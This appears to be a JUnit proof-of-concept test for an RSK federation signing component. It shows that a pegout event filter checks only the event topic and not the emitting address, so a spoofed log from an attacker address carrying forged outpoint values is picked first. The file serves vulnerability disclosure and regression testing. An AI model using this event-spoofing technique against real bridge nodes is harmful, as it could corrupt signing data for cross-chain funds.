package co.rsk.federate.signing.hsm.message;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

import co.rsk.bitcoinj.core.Coin;
import co.rsk.bitcoinj.core.Sha256Hash;
import co.rsk.crypto.Keccak256;
import co.rsk.peg.BridgeEvents;
import co.rsk.peg.bitcoin.UtxoUtils;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import org.bouncycastle.util.encoders.Hex;
import org.ethereum.core.Block;
import org.ethereum.core.CallTransaction;
import org.ethereum.core.Transaction;
import org.ethereum.core.TransactionReceipt;
import org.ethereum.vm.DataWord;
import org.ethereum.vm.LogInfo;
import org.ethereum.vm.PrecompiledContracts;
import org.junit.jupiter.api.Test;

class MissingAddressValidationPoCTest {

    // Attacker-controlled address (any address that is not Bridge)
    private static final byte[] ATTACKER_ADDRESS = Hex.decode("1234567890123456789012345678901234567890");

    // Legitimate Bridge address
    private static final byte[] BRIDGE_ADDRESS = PrecompiledContracts.BRIDGE_ADDR.getBytes();

    // Malicious outpoint values injected by attacker (1 BTC, 2 BTC, 3 BTC)
    private static final byte[] MALICIOUS_OUTPOINT_VALUES = Hex.decode("FE00E1F505FE00C2EB0BFE00A3E111");

    // Legitimate outpoint values from Bridge (0.5 BTC, 0.75 BTC)
    private static final byte[] LEGITIMATE_OUTPOINT_VALUES = Hex.decode("FE80F0FA02FEC0687804");

    @Test
    void spoofedEventPassesFilterAndCorruptsOutpointValues() {
        Sha256Hash pegoutBtcTxHash = Sha256Hash.wrap(
            Hex.decode("0000000000000000000000000000000000000000000000000000000000000001")
        );

        // Create spoofed event from attacker address with malicious payload
        LogInfo attackerLog = createPegoutTransactionCreatedLog(
            ATTACKER_ADDRESS,
            pegoutBtcTxHash,
            MALICIOUS_OUTPOINT_VALUES
        );

        // Create legitimate event from Bridge address
        LogInfo bridgeLog = createPegoutTransactionCreatedLog(
            BRIDGE_ADDRESS,
            pegoutBtcTxHash,
            LEGITIMATE_OUTPOINT_VALUES
        );

        // Verify addresses are different
        assertNotEquals(
            Hex.toHexString(ATTACKER_ADDRESS),
            Hex.toHexString(BRIDGE_ADDRESS)
        );

        // Both logs pass the filter because only topic signature is checked
        assertTrue(isPegoutTransactionCreatedLog(attackerLog));
        assertTrue(isPegoutTransactionCreatedLog(bridgeLog));

        // Simulate ReleaseCreationInformation with attacker's log appearing first
        List<LogInfo> logsWithAttackerFirst = new ArrayList<>();
        logsWithAttackerFirst.add(attackerLog);
        logsWithAttackerFirst.add(bridgeLog);

        TransactionReceipt receipt = mock(TransactionReceipt.class);
        when(receipt.getLogInfoList()).thenReturn(logsWithAttackerFirst);

        // decodeUtxoOutpointValues uses findFirst(), picks attacker's log
        List<Coin> extractedValues = decodeUtxoOutpointValues(receipt);

        // Verify attacker's malicious values were extracted instead of legitimate values
        List<Coin> expectedMaliciousValues = UtxoUtils.decodeOutpointValues(MALICIOUS_OUTPOINT_VALUES);
        List<Coin> expectedLegitimateValues = UtxoUtils.decodeOutpointValues(LEGITIMATE_OUTPOINT_VALUES);

        assertEquals(expectedMaliciousValues, extractedValues);
        assertNotEquals(expectedLegitimateValues, extractedValues);

        System.out.println("PASS: Spoofed event bypassed filter and corrupted outpoint values");
    }

    // Replicates ReleaseCreationInformation.isPegoutTransactionCreatedLog
    // Missing: address validation against PrecompiledContracts.BRIDGE_ADDR
    private boolean isPegoutTransactionCreatedLog(LogInfo log) {
        CallTransaction.Function pegoutTransactionCreatedEvent =
            BridgeEvents.PEGOUT_TRANSACTION_CREATED.getEvent();
        byte[] pegoutTransactionCreatedSignatureTopic =
            pegoutTransactionCreatedEvent.encodeSignatureLong();

        boolean logHasTopics = !log.getTopics().isEmpty();
        return logHasTopics &&
            Arrays.equals(log.getTopics().get(0).getData(), pegoutTransactionCreatedSignatureTopic);
    }

    // Replicates ReleaseCreationInformation.decodeUtxoOutpointValues
    private List<Coin> decodeUtxoOutpointValues(TransactionReceipt transactionReceipt) {
        return transactionReceipt.getLogInfoList().stream()
            .filter(this::isPegoutTransactionCreatedLog)
            .findFirst()
            .map(LogInfo::getData)
            .map(this::decodePegoutTransactionEventData)
            .map(UtxoUtils::decodeOutpointValues)
            .orElse(java.util.Collections.emptyList());
    }

    // Replicates ReleaseCreationInformation.decodePegoutTransactionEventData
    private byte[] decodePegoutTransactionEventData(byte[] pegoutCreatedTransactionEventData) {
        CallTransaction.Function pegoutTransactionCreatedEvent =
            BridgeEvents.PEGOUT_TRANSACTION_CREATED.getEvent();
        return (byte[]) pegoutTransactionCreatedEvent.decodeEventData(
            pegoutCreatedTransactionEventData)[0];
    }

    // Creates LogInfo with specified emitter address
    private LogInfo createPegoutTransactionCreatedLog(
        byte[] emitterAddress,
        Sha256Hash pegoutBtcTxHash,
        byte[] serializedOutpointValues
    ) {
        CallTransaction.Function pegoutTransactionCreatedEvent =
            BridgeEvents.PEGOUT_TRANSACTION_CREATED.getEvent();
        byte[] signatureTopic = pegoutTransactionCreatedEvent.encodeSignatureLong();

        List<DataWord> topics = new ArrayList<>();
        topics.add(DataWord.valueOf(signatureTopic));
        topics.add(DataWord.valueOf(pegoutBtcTxHash.getBytes()));

        byte[] encodedData = pegoutTransactionCreatedEvent.encodeEventData(serializedOutpointValues);

        return new LogInfo(emitterAddress, topics, encodedData);
    }
}
